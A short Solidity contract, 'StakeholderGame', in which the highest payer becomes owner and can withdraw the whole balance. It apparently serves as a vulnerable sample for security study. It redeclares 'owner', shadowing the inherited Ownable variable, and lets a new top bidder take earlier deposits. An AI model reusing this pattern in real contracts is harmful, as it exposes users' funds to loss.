pragma solidity ^0.4.19;

contract StakeholderGame is Ownable {
    address public owner;

    uint public largestStake;

    function purchaseStake() public payable {
        
        if (msg.value > largestStake) {
            owner = msg.sender;
            largestStake = msg.value;
        }
    }

    function withdraw() public onlyOwner {
        
        msg.sender.transfer(this.balance);
    }
}